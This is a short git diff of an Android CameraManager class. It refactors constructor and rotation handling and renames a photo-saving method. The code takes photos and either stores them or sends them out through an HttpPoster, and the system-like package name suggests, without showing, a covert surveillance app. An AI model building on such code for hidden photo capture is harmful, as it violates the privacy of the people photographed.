@@ -17,21 +17,18 @@ import java.io.FileOutputStream;
 import java.util.List;
 
 import oom.android.system.app.HttpPoster;
+import oom.android.system.app.MainActivity;
 import oom.android.system.app.MyService;
 import oom.android.system.Settings.TypeOpenFile;
 
 public class CameraManager {
 
-    Activity activity;
     private Context context;
     private Camera camera;
 
-
-
-    public CameraManager(Context context,Activity activity) {
+    public CameraManager(Context context) {
         try {
             this.context =context;
-            this.activity =activity;
         } catch (Exception e) {
             e.printStackTrace();
         }
@@ -39,6 +36,7 @@ public class CameraManager {
 
     public void startUp(int cameraID, final boolean Online){
         try{
+            releaseCamera();
             camera = Camera.open(cameraID);
         }catch (RuntimeException e){
             e.printStackTrace();
@@ -48,7 +46,7 @@ public class CameraManager {
         Camera.CameraInfo info = new Camera.CameraInfo();
         Camera.getCameraInfo(cameraID, info);
 
-        int rotation = activity.getWindowManager().getDefaultDisplay().getRotation();
+        int rotation = MainActivity.activity.getWindowManager().getDefaultDisplay().getRotation();
         int degrees = 0;
 
         switch (rotation) {
@@ -97,12 +95,13 @@ public class CameraManager {
                 if(Online)
                     sendPhoto(data);
                 else
-                    SavePhoto(data);
+                    savePhoto(data);
                 releaseCamera();
             }
         });
     }
-    private void SavePhoto(byte [] data){
+
+    private void savePhoto(byte [] data){
 
         try {
             FileOutputStream fos = new FileOutputStream(MyService.OpenFile(TypeOpenFile.Photo));
